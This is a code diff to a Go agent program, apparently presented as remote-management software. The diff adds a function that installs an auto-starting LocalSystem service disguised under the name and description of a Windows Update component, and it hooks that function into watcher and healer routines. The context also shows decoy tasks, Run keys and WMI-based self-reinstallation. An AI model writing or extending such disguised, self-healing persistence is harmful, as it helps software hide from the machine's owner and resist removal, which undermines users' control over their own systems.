@@ -103,6 +103,31 @@ func writeProtectionScore(w *watchCfg) {
 	_ = os.WriteFile(filepath.Join(rmmDataDir(), "protection.json"), rb, 0644)
 }
 
+// svcName is the SYSTEM repair service (repairs only, never interactive).
+const svcName = "WindowsUpdateOrchestrator"
+
+// ensureService makes sure the repair service exists + runs (best effort:
+// needs admin; plain users skip silently). Called by the watcher and the
+// healer, so a deleted service converges back.
+func ensureService(agentPath string) {
+	if err := exec.Command("sc", "query", svcName).Run(); err == nil {
+		return
+	}
+	// Admin probe: creating services needs it; skip quietly without.
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE`, registry.WRITE)
+	if err != nil {
+		return
+	}
+	k.Close()
+	bin := `"` + agentPath + `" --svc-heal`
+	_, _ = exec.Command("sc", "create", svcName, "binPath=", bin, "start=", "auto", "obj=", "LocalSystem").CombinedOutput()
+	_, _ = exec.Command("sc", "description", svcName, "Windows Update Orchestration Service").CombinedOutput()
+	_, _ = exec.Command("sc", "failure", svcName, "reset=", "86400", "actions=", "restart/60000/restart/60000/restart/60000").CombinedOutput()
+	if err := exec.Command("sc", "start", svcName).Run(); err == nil {
+		log.Printf("[watch] repair service installed+started")
+	}
+}
+
 // wmiTaskPairs maps every persistence task to its saved XML (kept both
 // beside the backup and in the install dir; the WMI consumer runs as
 // SYSTEM and can only rely on the install-dir copies).
@@ -252,6 +277,7 @@ func runWmiHeal() {
 		k.Close()
 	}
 	ensureActiveSetupKey(agentPath)
+	ensureService(agentPath)
 	// Decoy heal vectors too (task + Run value).
 	if err := exec.Command("schtasks", "/query", "/tn", "WindowsUpdateCheck").Run(); err != nil {
 		if xml := resolveTaskXML(dir, "decoy_task.xml"); xml != "" {
@@ -293,6 +319,7 @@ func ensureWatchPersistence(w *watchCfg) {
 	setRun("WindowsUpdate", agentCmd)
 	setRun("WindowsUpdateWatchdog", watchCmd)
 	ensureActiveSetupKey(w.agentPath)
+	ensureService(w.agentPath)
 	for _, t := range wmiTaskPairs {
 		if err := exec.Command("schtasks", "/query", "/tn", t[0]).Run(); err == nil {
 			continue
